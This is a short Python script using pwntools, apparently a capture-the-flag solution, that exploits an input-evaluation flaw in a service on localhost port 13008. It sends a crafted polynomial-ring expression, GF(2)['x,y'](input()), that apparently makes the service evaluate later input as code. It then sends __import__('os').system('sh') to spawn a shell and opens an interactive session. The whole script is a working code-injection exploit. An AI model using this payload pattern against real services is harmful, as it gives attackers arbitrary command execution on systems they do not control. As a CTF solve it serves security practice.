from pwn import * 



context.log_level = 'debug'  # Set log level to DEBUG




code = b'GF(2)["x,y"](input())'




r = remote('localhost' , 13008)
r.recvline()
r.sendline(code)
r.sendline(b'__import__("os").system("sh")')

r.interactive()

